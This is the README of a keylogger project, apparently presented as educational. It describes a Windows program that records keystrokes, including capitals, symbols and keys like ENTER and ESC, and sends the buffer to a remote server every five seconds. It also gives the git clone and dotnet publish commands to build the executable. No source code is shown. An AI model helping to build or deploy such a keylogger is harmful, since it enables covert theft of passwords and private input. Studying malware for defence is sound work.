# Keylogger

## Description
This is an application that captures key stroces and stores them in a temporary buffer, after 5 seconds the buffer content is sent to the remote server and it is cleaned. The keylogger can detect letters (capitals as well), symbols and some "invisible" symbols (ex: ENTER, ALT, ESC ...)

## Usage

#### Requirements:
For this to work I suppose that dotnet is already installed on the system.

Folow the commands below:

```
git clone -b keylogger https://github.com/MarioUta/Malwerinator-educational-.git
cd Malwerinator-educational-/Keylogger
dotnet publish -c Release
```

Now the executable should be created. The path to it is: .\bin\Release\net8.0\win-x64\publish\Program.exe
